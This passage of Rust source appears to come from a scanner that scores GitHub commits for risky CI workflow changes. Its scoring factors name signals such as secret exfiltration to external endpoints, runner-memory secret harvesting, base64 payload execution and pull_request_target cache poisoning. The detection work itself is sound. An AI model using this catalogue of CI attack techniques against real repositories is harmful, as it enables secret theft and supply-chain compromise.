        .or_else(|| action_use.reference.strip_prefix("refs/tags/"))
        .unwrap_or(&action_use.reference);
    let resolved = if github_ref_exists(&normalized_repo, "heads", reference) {
        ActionRefType::Branch
    } else if github_ref_exists(&normalized_repo, "tags", reference) {
        ActionRefType::Tag
    } else {
        ActionRefType::ClearlyMutable
    };
    cache.insert(cache_key, resolved.clone());
    resolved
}

fn github_ref_exists(repo: &str, namespace: &str, reference: &str) -> bool {
    gh_json(
        &format!("repos/{repo}/git/ref/{namespace}/{reference}"),
        false,
    )
    .is_ok()
}

fn normalized_action_key(action_use: &ActionUse) -> String {
    format!(
        "{}/{}:{}",
        action_use.owner.to_ascii_lowercase(),
        action_use.repo.to_ascii_lowercase(),
        action_use
            .subpath
            .as_deref()
            .unwrap_or("")
            .to_ascii_lowercase()
    )
}

fn action_repo_name(action_use: &ActionUse) -> String {
    format!(
        "{}/{}",
        action_use.owner.to_ascii_lowercase(),
        action_use.repo.to_ascii_lowercase()
    )
}

fn known_compromised_action_reason(action_use: &ActionUse) -> Option<&'static str> {
    let repo = action_repo_name(action_use);
    KNOWN_COMPROMISED_ACTIONS
        .iter()
        .find_map(|(known_repo, reason)| (repo == *known_repo).then_some(*reason))
}

fn action_ref_downgrades_to_mutable(removed: &[ActionUse], added: &[ActionUse]) -> bool {
    let removed_by_key = removed
        .iter()
        .map(|action_use| (normalized_action_key(action_use), action_use))
        .collect::<HashMap<_, _>>();
    added.iter().any(|added_use| {
        let Some(removed_use) = removed_by_key.get(&normalized_action_key(added_use)) else {
            return false;
        };
        removed_use.reference != added_use.reference
            && removed_use.is_pinned()
            && added_use.is_mutable()
    })
}

fn action_ref_changed(removed: &[ActionUse], added: &[ActionUse]) -> bool {
    let removed_by_key = removed
        .iter()
        .map(|action_use| (normalized_action_key(action_use), action_use))
        .collect::<HashMap<_, _>>();
    added.iter().any(|added_use| {
        removed_by_key
            .get(&normalized_action_key(added_use))
            .is_some_and(|removed_use| removed_use.reference != added_use.reference)
    })
}

fn has_privileged_workflow_capability(
    adds_write_permissions: bool,
    hands_repo_write_token: bool,
    publishes_registry: bool,
    registry_auth: bool,
    inherits_secrets: bool,
) -> bool {
    adds_write_permissions
        || hands_repo_write_token
        || publishes_registry
        || registry_auth
        || inherits_secrets
}

fn has_pull_request_target_untrusted_code_mitigation(added_lines: &str) -> bool {
    if PERSIST_CREDENTIALS_FALSE_RE.is_match(added_lines) {
        return true;
    }

    let removes_default_permissions = EMPTY_PERMISSIONS_RE.is_match(added_lines);
    let gates_fork_execution = PR_TARGET_FORK_OR_APPROVAL_GATE_RE.is_match(added_lines);
    let sanitizes_cross_job_artifact = PR_TARGET_SANITIZED_ARTIFACT_RE.is_match(added_lines);

    removes_default_permissions && (gates_fork_execution || sanitizes_cross_job_artifact)
}

fn diff_lines_with_prefix(patch: &str, prefix: char) -> String {
    patch
        .lines()
        .filter(|line| line.starts_with(prefix))
        .collect::<Vec<_>>()
        .join("\n")
}

fn has_pull_request_target_cache_poisoning_remediation_context(
    patch: &str,
    added_lines: &str,
    removed_lines: &str,
) -> bool {
    let removes_pr_merge_ref_checkout = REMOVED_PR_MERGE_REF_CHECKOUT_RE.is_match(removed_lines);
    let removes_untrusted_code_execution =
        REMOVED_UNTRUSTED_CODE_EXECUTION_RE.is_match(removed_lines);
    let removes_cache_or_setup_action = REMOVED_CACHE_OR_SETUP_ACTION_RE.is_match(removed_lines);

    let structural_remediation = removes_pr_merge_ref_checkout
        && removes_untrusted_code_execution
        && (removes_cache_or_setup_action || CACHE_OR_SETUP_CONTEXT_RE.is_match(patch));
    let documented_trigger_replacement = PULL_REQUEST_RE.is_match(added_lines)
        && PR_TARGET_CACHE_POISONING_REMEDIATION_CONTEXT_RE.is_match(patch);

    structural_remediation || documented_trigger_replacement
}

fn has_privileged_mutable_third_party_dependency(
    action_uses: &[ActionUse],
    privileged_workflow_capability: bool,
) -> bool {
    privileged_workflow_capability && !mutable_third_party_actions(action_uses).is_empty()
}

fn has_privileged_mutable_reusable_workflow(
    action_uses: &[ActionUse],
    privileged_workflow_capability: bool,
) -> bool {
    privileged_workflow_capability && !mutable_reusable_workflows(action_uses).is_empty()
}

fn analyze_commit(
    repo: &str,
    summary: &CommitSeed,
    enrich: bool,
    show_evidence: bool,
    include_weak_workflow_signals: bool,
) -> Result<Option<Finding>> {
    let Some(sha) = summary.sha() else {
        return Ok(None);
    };
    let commit = gh_json(&format!("repos/{repo}/commits/{sha}"), false)?;
    let files = commit
        .get("files")
        .and_then(Value::as_array)
        .cloned()
        .unwrap_or_default();
    let workflow_files = files
        .iter()
        .filter(|file| {
            file.get("filename")
                .and_then(Value::as_str)
                .map(is_sensitive_automation_file)
                .unwrap_or(false)
        })
        .cloned()
        .collect::<Vec<_>>();
    let archive_files = files
        .iter()
        .filter(|file| {
            file.get("filename")
                .and_then(Value::as_str)
                .map(|filename| ARCHIVE_RE.is_match(filename))
                .unwrap_or(false)
        })
        .cloned()
        .collect::<Vec<_>>();

    let commit_meta = commit.get("commit").unwrap_or(&Value::Null);
    let author_meta = commit_meta.get("author").unwrap_or(&Value::Null);
    let parent_sha = commit
        .get("parents")
        .and_then(Value::as_array)
        .and_then(|parents| parents.first())
        .and_then(|parent| parent.get("sha"))
        .and_then(Value::as_str);
    let message = commit_meta
        .get("message")
        .and_then(Value::as_str)
        .unwrap_or_default();
    let author_name = author_meta
        .get("name")
        .and_then(Value::as_str)
        .unwrap_or("");
    let author_email = author_meta
        .get("email")
        .and_then(Value::as_str)
        .unwrap_or("");
    let author = format!("{author_name} <{author_email}>").trim().to_string();
    let mut finding = Finding {
        repo: repo.to_string(),
        sha: sha.to_string(),
        url: commit
            .get("html_url")
            .and_then(Value::as_str)
            .unwrap_or("")
            .to_string(),
        date: author_meta
            .get("date")
            .and_then(Value::as_str)
            .unwrap_or("")
            .to_string(),
        author,
        message: redact_message(message.lines().next().unwrap_or_default()),
        score: 0,
        factors: Vec::new(),
        workflow_files: workflow_files
            .iter()
            .map(|file| {
                file.get("filename")
                    .and_then(Value::as_str)
                    .unwrap_or("")
                    .to_string()
            })
            .collect(),
        archive_files: archive_files
            .iter()
            .map(|file| {
                file.get("filename")
                    .and_then(Value::as_str)
                    .unwrap_or("")
                    .to_string()
            })
            .collect(),
        actions_runs: Vec::new(),
        pull_requests: Vec::new(),
        evidence_added: Vec::new(),
        evidence_removed: Vec::new(),
        archive_blobs: Vec::new(),
        npm_oidc_packages: Vec::new(),
        message_evidence: Vec::new(),
        factor_hits: Vec::new(),
    };

    let (message_score, message_factors, message_evidence) = message_secret_evidence(message);
    for factor in message_factors {
        add_factor(&mut finding, 0, &factor);
    }
    finding.score += message_score;
    if message_score > 0 {
        finding.factor_hits.push(FactorHit {
            factor: "commit_message_secret_evidence_score".to_string(),
            score: message_score,
        });
    }
    finding.message_evidence = message_evidence;

    if workflow_files.is_empty() {
        return Ok(if finding.score > 0 {
            Some(finding)
        } else {
            None
        });
    }

    let workflow_patches = workflow_files
        .iter()
        .map(|file| patch_for_file(file, repo, sha, parent_sha))
        .collect::<Vec<_>>();
    let combined_patch = workflow_patches.join("\n");
    let added_lines = diff_lines_with_prefix(&combined_patch, '+');
    let removed_lines = diff_lines_with_prefix(&combined_patch, '-');

    if show_evidence {
        finding.evidence_added = extract_evidence_lines(&added_lines, "+", 20);
        finding.evidence_removed = extract_evidence_lines(&removed_lines, "-", 20);
        finding.archive_blobs = archive_blob_evidence(&archive_files);
        finding.npm_oidc_packages =
            extract_npm_oidc_packages(&format!("{added_lines}\n{removed_lines}"));
    }

    let mut strong_workflow_signal = false;
    let explicit_token_exposure = token_exposure_lines(&added_lines);
    let removed_token_exposure = removed_token_exposure_lines(&removed_lines);
    let generated_workflow_regen =
        is_generated_workflow_regen(&workflow_files, message, &added_lines, &removed_lines);
    let generated_dependency_pin_regen =
        is_generated_dependency_pin_regen(generated_workflow_regen, message);
    let locked_workflow_bundle =
        is_locked_workflow_bundle(&workflow_files, &added_lines, &removed_lines);
    let has_action_manifest_change = has_action_manifest_file(&workflow_files);
    let has_dependency_manifest_change = has_dependency_manifest_file(&files);
    let adds_agent_instruction_file = has_added_agent_instruction_file(&workflow_files);
    let adds_agent_editor_autorun_file = has_added_agent_editor_autorun_file(&workflow_files);
    let has_agent_payload_script = has_added_agent_payload_script(&workflow_files);
    let dependency_update_cover_message =
        DEPENDENCY_UPDATE_MESSAGE_RE.is_match(message) && !has_dependency_manifest_change;
    let changes_action_to_composite = has_action_manifest_change
        && ACTION_MANIFEST_COMPOSITE_RE.is_match(&added_lines)
        && ACTION_MANIFEST_DOCKER_RE.is_match(&removed_lines);
    let action_manifest_remote_script =
        has_action_manifest_change && ACTION_MANIFEST_REMOTE_SCRIPT_RE.is_match(&added_lines);
    let agent_editor_autorun_hook =
        adds_agent_editor_autorun_file && AGENT_EDITOR_AUTORUN_HOOK_RE.is_match(&added_lines);
    let agent_runtime_bootstrap =
        adds_agent_editor_autorun_file && AGENT_RUNTIME_BOOTSTRAP_RE.is_match(&added_lines);
    let protective_workflow_context = has_protective_workflow_context(&workflow_files);
    let publishes_local_archive = LOCAL_PUBLISH_RE.is_match(&added_lines);
    let publishes_dynamic_artifact = DYNAMIC_PUBLISH_RE.is_match(&added_lines);
    let publishes_temp_or_home_artifact = TEMP_OR_HOME_PUBLISH_RE.is_match(&added_lines);
    let publishes_registry = PUBLISH_RE.is_match(&added_lines);
    let adds_artifact_input = ARTIFACT_INPUT_RE.is_match(&added_lines);
    let fetches_untrusted_artifact = has_untrusted_artifact_fetch(&added_lines);
    let fetches_external_artifact = has_external_artifact_fetch(&added_lines);
    let manual_oidc = MANUAL_OIDC_RE.is_match(&added_lines);
    let removed_manual_oidc = MANUAL_OIDC_RE.is_match(&removed_lines);
    let oidc_or_provenance = OIDC_TOKEN_RE.is_match(&added_lines);
    let registry_auth = REGISTRY_AUTH_RE.is_match(&added_lines);
    let removed_registry_auth = REGISTRY_AUTH_RE.is_match(&removed_lines);
    let token_exposure = !explicit_token_exposure.is_empty();
    let adds_pull_request_target = PR_TARGET_RE.is_match(&added_lines);
    let checks_out_pr_head = PR_HEAD_CHECKOUT_RE.is_match(&added_lines);
    let checks_out_pr_merge_ref = PR_MERGE_REF_CHECKOUT_RE.is_match(&added_lines);
    let adds_write_all_permissions = WRITE_ALL_PERMISSIONS_RE.is_match(&added_lines);
    let adds_id_token_write = ID_TOKEN_WRITE_RE.is_match(&added_lines);
    let adds_actions_write = ACTIONS_WRITE_RE.is_match(&added_lines);
    let adds_packages_write = PACKAGES_WRITE_RE.is_match(&added_lines);
    let adds_write_permissions = WRITE_PERMISSIONS_RE.is_match(&added_lines);
    let adds_workflow_run = WORKFLOW_RUN_RE.is_match(&added_lines);
    let downloads_workflow_artifact = WORKFLOW_ARTIFACT_DOWNLOAD_RE.is_match(&added_lines);
    let checks_out_workflow_run_head = WORKFLOW_RUN_HEAD_CHECKOUT_RE.is_match(&added_lines);
    let adds_continue_on_error = CONTINUE_ON_ERROR_RE.is_match(&added_lines);
    let adds_auto_push_or_merge = AUTO_PUSH_OR_MERGE_RE.is_match(&added_lines);
    let creates_pr_from_ci = PR_CREATE_RE.is_match(&added_lines);
    let modifies_branch_protection = BRANCH_PROTECTION_RE.is_match(&added_lines);
    let adds_dispatch_trigger = DISPATCH_TRIGGER_RE.is_match(&added_lines);
    let inherits_secrets = SECRETS_INHERIT_RE.is_match(&added_lines);
    let uses_self_hosted_runner = SELF_HOSTED_RE.is_match(&added_lines);
    let adds_check_bypass = CHECK_BYPASS_RE.is_match(&added_lines);
    let adds_comment_or_review_trigger = COMMENT_OR_REVIEW_TRIGGER_RE.is_match(&added_lines);
    let reads_untrusted_text = UNTRUSTED_TEXT_SOURCE_RE.is_match(&added_lines);
    let adds_agentic_tooling = AGENTIC_TOOL_RE.is_match(&added_lines);
    let adds_agentic_secret = AGENTIC_SECRET_RE.is_match(&added_lines);
    let fetches_fork_pr_head = FORK_PR_FETCH_RE.is_match(&added_lines);
    let reads_pr_metadata = PR_METADATA_FETCH_RE.is_match(&added_lines);
    let grants_agentic_tools = AGENTIC_TOOL_GRANT_RE.is_match(&added_lines);
    let hands_agent_write_token = AGENTIC_GIT_TOKEN_RE.is_match(&added_lines);
    let hands_repo_write_token = REPO_WRITE_TOKEN_RE.is_match(&added_lines);
    let stages_artifact_in_temp_or_home = ARTIFACT_STAGING_RE.is_match(&added_lines);
    let persists_checkout_credentials = PERSIST_CREDENTIALS_TRUE_RE.is_match(&added_lines);
    let persists_git_credentials = GIT_CREDENTIAL_PERSISTENCE_RE.is_match(&added_lines);
    let uploads_sensitive_artifact = SENSITIVE_ARTIFACT_UPLOAD_RE.is_match(&added_lines);
    let caches_sensitive_paths = SENSITIVE_CACHE_PATH_RE.is_match(&added_lines);
    let executes_remote_script = REMOTE_SCRIPT_EXECUTION_RE.is_match(&added_lines);
    let executes_base64_payload = BASE64_PAYLOAD_EXECUTION_RE.is_match(&added_lines);
    let executes_powershell_encoded_command = POWERSHELL_ENCODED_COMMAND_RE.is_match(&added_lines);
    let writes_untrusted_github_env = GITHUB_ENV_UNTRUSTED_WRITE_RE.is_match(&added_lines);
    let writes_untrusted_github_output = GITHUB_OUTPUT_UNTRUSTED_WRITE_RE.is_match(&added_lines);
    let github_script_dynamic_code = GITHUB_SCRIPT_DYNAMIC_CODE_RE.is_match(&added_lines);
    let github_script_untrusted_context = GITHUB_SCRIPT_UNTRUSTED_CONTEXT_RE.is_match(&added_lines);
    let removes_package_script_guard = PACKAGE_SCRIPT_GUARD_REMOVAL_RE.is_match(&combined_patch);
    let shell_uses_untrusted_ref = UNTRUSTED_REF_SHELL_INTERPOLATION_RE.is_match(&added_lines);
    let exposes_docker_socket = DOCKER_SOCKET_EXPOSURE_RE.is_match(&added_lines);
    let cloud_secret_external_network =
        CLOUD_SECRET_WITH_EXTERNAL_NETWORK_RE.is_match(&added_lines);
    let has_direct_script_injection = SCRIPT_INJECTION_RE.is_match(&added_lines);
    let enumerates_secrets = SECRET_ENUMERATION_RE.is_match(&added_lines);
    let exfiltrates_externally = EXTERNAL_SECRET_EXFIL_RE.is_match(&added_lines);
    let secret_enumeration_exfil_path = has_secret_enumeration_exfil_path(&added_lines);
    let explicit_secret_refs = explicit_secret_reference_count(&added_lines);
    let external_non_github_network_call = has_external_non_github_network_call(&added_lines);
    let suspicious_workflow_file = has_suspicious_workflow_file(&workflow_files)
        || GHOSTACTION_WORKFLOW_NAME_RE.is_match(&added_lines);
    let executes_untrusted_code = UNTRUSTED_CODE_EXECUTION_RE.is_match(&added_lines);
    let uses_cache_or_setup_action = CACHE_OR_SETUP_ACTION_RE.is_match(&added_lines)
        || (adds_pull_request_target && CACHE_OR_SETUP_CONTEXT_RE.is_match(&combined_patch));
    let removes_pull_request_target_cache_poisoning_surface =
        workflow_patches.iter().any(|patch| {
            let patch_added_lines = diff_lines_with_prefix(patch, '+');
            let patch_removed_lines = diff_lines_with_prefix(patch, '-');

            REMOVED_PR_TARGET_RE.is_match(&patch_removed_lines)
                && has_pull_request_target_cache_poisoning_remediation_context(
                    patch,
                    &patch_added_lines,
                    &patch_removed_lines,
                )
        });
    let disables_checkout_credentials = PERSIST_CREDENTIALS_FALSE_RE.is_match(&added_lines);
    let mitigates_pr_target_untrusted_code =
        has_pull_request_target_untrusted_code_mitigation(&added_lines);
    let runner_memory_secret_harvesting = RUNNER_MEMORY_SECRET_RE.is_match(&added_lines);
    let action_uses = extract_action_uses(&added_lines, repo);
    let removed_action_uses = extract_action_uses(&removed_lines, repo);
    let mutable_third_party_action_uses = mutable_third_party_actions(&action_uses);
    let mutable_reusable_workflow_uses = mutable_reusable_workflows(&action_uses);
    let has_unpinned_external_action = !mutable_third_party_action_uses.is_empty();
    let uses_unpinned_reusable_workflow = !mutable_reusable_workflow_uses.is_empty();
    let has_known_compromised_action = action_uses
        .iter()
        .any(|action_use| known_compromised_action_reason(action_use).is_some());
    let changes_action_ref = action_ref_changed(&removed_action_uses, &action_uses);
    let downgrades_action_ref_to_mutable =
        action_ref_downgrades_to_mutable(&removed_action_uses, &action_uses);
    let commenter_write_gate = COMMENTER_WRITE_GATE_RE.is_match(&added_lines);
    let merged_pr_only_gate = MERGED_PR_ONLY_GATE_RE.is_match(&added_lines);
    let agentic_context = adds_agentic_tooling || adds_agentic_secret;
    let adds_skip_guard = SKIP_GUARD_RE.is_match(&added_lines);
    let broad_trigger =
        WEAK_TRIGGER_RE.is_match(&added_lines) || TAG_TRIGGER_RE.is_match(&added_lines);
    let removed_gates = REMOVED_GATES_RE.is_match(&removed_lines);
    let removes_protective_workflow =
        has_removed_protective_workflow(&workflow_files, &removed_lines);
    let committed_archive = !archive_files.is_empty();
    let bulk_workflow = workflow_files.len() >= 3;
    let privileged_workflow_capability = has_privileged_workflow_capability(
        adds_write_permissions,
        hands_repo_write_token,
        publishes_registry,
        registry_auth,
        inherits_secrets,
    );
    let dependency_privileged_workflow_capability = privileged_workflow_capability
        && !(adds_pull_request_target && mitigates_pr_target_untrusted_code);

    if token_exposure {
        strong_workflow_signal = true;
        add_factor(&mut finding, 8, "secret_material_printed_or_encoded");
        if show_evidence {
            for line in explicit_token_exposure.iter().take(5) {
                let evidence = format!("token exposure line: {line}");
                if !finding
                    .message_evidence
                    .iter()
                    .any(|item| item == &evidence)
                {
                    finding.message_evidence.push(evidence);
                }
            }
        }
    }
    if !removed_token_exposure.is_empty() {
        add_factor(
            &mut finding,
            4,
            "removes_secret_material_printing_or_encoding",
        );
        if removed_manual_oidc || removed_registry_auth {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                5,
                "removed_oidc_registry_token_exposure_forensics",
            );
        }
        if show_evidence {
            for line in removed_token_exposure.iter().take(5) {
                let evidence = format!("removed token exposure line: {line}");
                if !finding
                    .message_evidence
                    .iter()
                    .any(|item| item == &evidence)
                {
                    finding.message_evidence.push(evidence);
                }
            }
        }
    }

    if adds_write_all_permissions {
        add_factor(&mut finding, 2, "adds_write_all_permissions");
    }
    if adds_id_token_write {
        add_factor(&mut finding, 0, "adds_id_token_write_permission");
    }
    if adds_actions_write {
        add_factor(&mut finding, 1, "adds_actions_write_permission");
    }
    if adds_packages_write {
        add_factor(&mut finding, 1, "adds_packages_write_permission");
    }
    if persists_checkout_credentials {
        add_factor(&mut finding, 1, "persists_checkout_credentials");
        if (checks_out_pr_head || checks_out_pr_merge_ref || checks_out_workflow_run_head)
            && (adds_write_permissions || hands_repo_write_token || registry_auth)
        {
            strong_workflow_signal = true;
            add_factor(&mut finding, 5, "privileged_checkout_persists_credentials");
        }
    }
    if persists_git_credentials {
        add_factor(&mut finding, 2, "persists_git_credentials");
        if hands_repo_write_token || adds_write_permissions || registry_auth {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                5,
                "git_credential_persistence_with_repo_token",
            );
        }
    }
    if uploads_sensitive_artifact {
        strong_workflow_signal = true;
        add_factor(&mut finding, 7, "sensitive_files_uploaded_as_artifact");
    }
    if caches_sensitive_paths {
        add_factor(&mut finding, 3, "caches_sensitive_credential_path");
        if adds_pull_request_target
            || adds_workflow_run
            || adds_write_permissions
            || registry_auth
            || explicit_secret_refs > 0
        {
            strong_workflow_signal = true;
            add_factor(&mut finding, 5, "sensitive_paths_cached_in_workflow");
        }
    }
    if executes_remote_script {
        add_factor(&mut finding, 3, "downloads_and_executes_remote_script");
        if privileged_workflow_capability || has_action_manifest_change || publishes_registry {
            strong_workflow_signal = true;
            add_factor(&mut finding, 5, "remote_script_pipe_to_shell");
        }
    }
    if executes_base64_payload {
        strong_workflow_signal = true;
        add_factor(&mut finding, 7, "base64_decoded_payload_execution");
    }
    if executes_powershell_encoded_command {
        strong_workflow_signal = true;
        add_factor(&mut finding, 7, "powershell_encoded_command_execution");
    }
    if writes_untrusted_github_env {
        add_factor(&mut finding, 2, "writes_untrusted_context_to_github_env");
        if adds_write_permissions
            || hands_repo_write_token
            || publishes_registry
            || registry_auth
            || adds_pull_request_target
        {
            strong_workflow_signal = true;
            add_factor(&mut finding, 5, "untrusted_input_written_to_github_env");
        }
    }
    if writes_untrusted_github_output {
        add_factor(&mut finding, 2, "writes_untrusted_context_to_github_output");
    }
    if github_script_dynamic_code {
        add_factor(&mut finding, 2, "github_script_dynamic_code_execution");
    }
    if github_script_untrusted_context {
        add_factor(&mut finding, 1, "github_script_reads_untrusted_context");
    }
    if github_script_dynamic_code
        && github_script_untrusted_context
        && (adds_write_permissions || hands_repo_write_token || registry_auth || publishes_registry)
    {
        strong_workflow_signal = true;
        add_factor(
            &mut finding,
            6,
            "github_script_executes_untrusted_dynamic_code",
        );
    }
    if removes_package_script_guard {
        add_factor(&mut finding, 2, "removes_package_script_safety_guard");
        if publishes_registry || registry_auth || adds_write_permissions || adds_pull_request_target
        {
            strong_workflow_signal = true;
            add_factor(&mut finding, 5, "package_script_safety_guard_removed");
        }
    }
    if shell_uses_untrusted_ref {
        add_factor(&mut finding, 2, "shell_uses_untrusted_ref_name");
        if adds_write_permissions
            || hands_repo_write_token
            || publishes_registry
            || registry_auth
            || uses_self_hosted_runner
        {
            strong_workflow_signal = true;
            add_factor(&mut finding, 5, "privileged_shell_uses_untrusted_ref_name");
        }
    }
    if exposes_docker_socket {
        add_factor(&mut finding, 2, "exposes_docker_socket");
        if adds_pull_request_target
            || adds_workflow_run
            || uses_self_hosted_runner
            || checks_out_pr_head
        {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                6,
                "docker_socket_exposed_to_untrusted_workflow",
            );
        }
    }
    if cloud_secret_external_network {
        strong_workflow_signal = true;
        add_factor(&mut finding, 7, "cloud_secret_with_external_network_path");
    }

    if adds_pull_request_target {
        add_factor(&mut finding, 1, "adds_pull_request_target");
        if adds_id_token_write && (checks_out_pr_head || checks_out_pr_merge_ref || registry_auth) {
            strong_workflow_signal = true;
            add_factor(&mut finding, 6, "pull_request_target_with_oidc_write");
        }
        if explicit_secret_refs > 0 && (checks_out_pr_head || checks_out_pr_merge_ref) {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                6,
                "pull_request_target_with_explicit_secret_use",
            );
        }
        if checks_out_pr_merge_ref {
            add_factor(
                &mut finding,
                3,
                "checks_out_pr_merge_ref_in_privileged_context",
            );
        }
        if uses_cache_or_setup_action {
            add_factor(
                &mut finding,
                2,
                "uses_cache_or_setup_action_in_untrusted_pr_job",
            );
        }
        if executes_untrusted_code && (checks_out_pr_head || checks_out_pr_merge_ref) {
            add_factor(
                &mut finding,
                2,
                "executes_package_build_in_untrusted_pr_context",
            );
        }
        if checks_out_pr_merge_ref && executes_untrusted_code && uses_cache_or_setup_action {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                7,
                "pull_request_target_cache_poisoning_surface",
            );
        }
        if checks_out_pr_head {
            add_factor(&mut finding, 3, "checks_out_pr_head_in_privileged_context");
            if executes_untrusted_code && mitigates_pr_target_untrusted_code {
                add_factor(
                    &mut finding,
                    -4,
                    "pull_request_target_untrusted_code_mitigated",
                );
            }
            if adds_write_permissions || registry_auth || adds_auto_push_or_merge {
                if !mitigates_pr_target_untrusted_code {
                    strong_workflow_signal = true;
                    add_factor(
                        &mut finding,
                        6,
                        "pull_request_target_untrusted_checkout_with_write_capability",
                    );
                }
            }
            if executes_untrusted_code && !disables_checkout_credentials {
                if !mitigates_pr_target_untrusted_code {
                    strong_workflow_signal = true;
                    add_factor(
                        &mut finding,
                        5,
                        "pull_request_target_executes_untrusted_code",
                    );
                }
            }
        }
    }
    if removes_pull_request_target_cache_poisoning_surface {
        add_factor(&mut finding, 1, "removes_pull_request_target");
        strong_workflow_signal = true;
        add_factor(
            &mut finding,
            5,
            "removes_pull_request_target_cache_poisoning_surface",
        );
    }

    if adds_workflow_run {
        add_factor(&mut finding, 1, "adds_workflow_run_trigger");
        if checks_out_workflow_run_head {
            add_factor(&mut finding, 3, "checks_out_workflow_run_head_ref");
            if adds_write_permissions
                || publishes_registry
                || registry_auth
                || adds_auto_push_or_merge
            {
                strong_workflow_signal = true;
                add_factor(
                    &mut finding,
                    6,
                    "workflow_run_untrusted_checkout_with_write_or_publish",
                );
            }
        }
        if downloads_workflow_artifact {
            add_factor(&mut finding, 2, "downloads_artifact_in_workflow_run");
            if adds_write_permissions || publishes_registry || adds_auto_push_or_merge {
                strong_workflow_signal = true;
                add_factor(
                    &mut finding,
                    5,
                    "workflow_run_artifact_with_write_or_publish_capability",
                );
            }
        }
    }

    if adds_continue_on_error {
        add_factor(&mut finding, 2, "adds_continue_on_error");
        if removed_gates || publishes_registry || adds_auto_push_or_merge {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                4,
                "check_suppression_with_sensitive_follow_on_change",
            );
        }
    }

    if adds_auto_push_or_merge {
        add_factor(&mut finding, 2, "adds_ci_push_or_merge");
        if adds_write_permissions || registry_auth || broad_trigger {
            strong_workflow_signal = true;
            add_factor(&mut finding, 5, "ci_push_or_merge_with_write_permissions");
        }
    }
    if creates_pr_from_ci {
        add_factor(&mut finding, 1, "creates_pull_request_from_ci");
    }
    if hands_repo_write_token {
        add_factor(&mut finding, 1, "hands_repo_write_token");
    }
    if stages_artifact_in_temp_or_home {
        add_factor(&mut finding, 1, "stages_artifact_in_temp_or_home");
    }
    if has_action_manifest_change {
        add_factor(&mut finding, 0, "changes_action_manifest");
    }
    if changes_action_to_composite {
        add_factor(
            &mut finding,
            2,
            "action_manifest_switches_docker_to_composite",
        );
    }
    if action_manifest_remote_script {
        strong_workflow_signal = true;
        add_factor(&mut finding, 8, "action_manifest_remote_script_execution");
    }
    if removes_protective_workflow {
        add_factor(&mut finding, 0, "removes_protective_workflow");
        if has_action_manifest_change || action_manifest_remote_script {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                4,
                "security_workflow_removed_with_action_manifest_change",
            );
        }
    }
    if adds_agent_instruction_file {
        add_factor(&mut finding, 1, "adds_agent_instruction_file");
        if has_action_manifest_change || removes_protective_workflow {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                3,
                "agent_instruction_file_with_action_manifest_change",
            );
        }
    }
    if adds_agent_editor_autorun_file {
        add_factor(&mut finding, 2, "adds_agent_or_editor_autorun_file");
    }
    if has_agent_payload_script {
        add_factor(&mut finding, 1, "adds_or_changes_agent_payload_script");
    }
    if dependency_update_cover_message
        && (adds_agent_editor_autorun_file
            || has_agent_payload_script
            || has_action_manifest_change)
    {
        add_factor(
            &mut finding,
            2,
            "dependency_update_cover_message_for_sensitive_automation",
        );
    }
    if agent_editor_autorun_hook {
        strong_workflow_signal = true;
        add_factor(
            &mut finding,
            6,
            "agent_or_editor_startup_hook_executes_repo_code",
        );
    }
    if agent_runtime_bootstrap {
        add_factor(
            &mut finding,
            4,
            "agent_runtime_bootstrap_executes_local_payload",
        );
        if agent_editor_autorun_hook || has_agent_payload_script {
            strong_workflow_signal = true;
            add_factor(&mut finding, 4, "agent_autorun_bootstrap_chain");
        }
    }
    if suspicious_workflow_file {
        add_factor(&mut finding, 1, "suspicious_workflow_name_or_path");
    }
    if explicit_secret_refs >= 2 {
        add_factor(&mut finding, 2, "references_multiple_explicit_secrets");
        if external_non_github_network_call {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                6,
                "explicit_secret_exfiltration_to_external_endpoint",
            );
        }
        if suspicious_workflow_file
            && external_non_github_network_call
            && (broad_trigger
                || DISPATCH_TRIGGER_RE.is_match(&added_lines)
                || WORKFLOW_DISPATCH_RE.is_match(&added_lines))
        {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                5,
                "ghostaction_style_secret_exfiltration_workflow",
            );
        }
    }
    if runner_memory_secret_harvesting && external_non_github_network_call {
        strong_workflow_signal = true;
        add_factor(
            &mut finding,
            6,
            "runner_memory_secret_harvesting_with_external_exfiltration",
        );
    }
    let mut action_ref_cache = HashMap::new();
    for action_use in &action_uses {
        let resolved_ref_type = resolved_action_ref_type(action_use, &mut action_ref_cache);
        add_factor(
            &mut finding,
            0,
            action_ref_type_factor(action_use.reusable_workflow, &resolved_ref_type),
        );
        if resolved_ref_type != action_use.ref_type {
            add_factor(&mut finding, 0, "resolved_action_ref_type_via_github");
        }
    }
    if changes_action_ref {
        add_factor(&mut finding, 0, "changes_action_dependency_ref");
    }
    if downgrades_action_ref_to_mutable {
        add_factor(
            &mut finding,
            2,
            "action_dependency_ref_downgrade_to_mutable",
        );
        if privileged_workflow_capability {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                4,
                "privileged_action_dependency_ref_downgrade_to_mutable",
            );
        }
    }
    if has_known_compromised_action {
        add_factor(&mut finding, 2, "uses_known_compromised_action_repo");
        if action_uses.iter().any(|action_use| {
            known_compromised_action_reason(action_use).is_some() && action_use.is_mutable()
        }) {
            strong_workflow_signal = true;
            add_factor(&mut finding, 5, "known_compromised_mutable_action_ref");
        }
        if privileged_workflow_capability {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                5,
                "known_compromised_action_in_privileged_workflow",
            );
        }
    }
    if has_unpinned_external_action {
        add_factor(&mut finding, 1, "introduces_unpinned_external_action");
        if has_privileged_mutable_third_party_dependency(
            &action_uses,
            dependency_privileged_workflow_capability,
        ) {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                4,
                "unpinned_third_party_action_in_privileged_workflow",
            );
        }
    }
    if has_direct_script_injection {
        add_factor(&mut finding, 2, "direct_untrusted_context_interpolation");
        if adds_write_permissions
            || hands_repo_write_token
            || publishes_registry
            || registry_auth
            || uses_self_hosted_runner
        {
            strong_workflow_signal = true;
            add_factor(
                &mut finding,
                5,
                "direct_script_injection_in_privileged_workflow",
            );
        }
    }
    if enumerates_secrets {
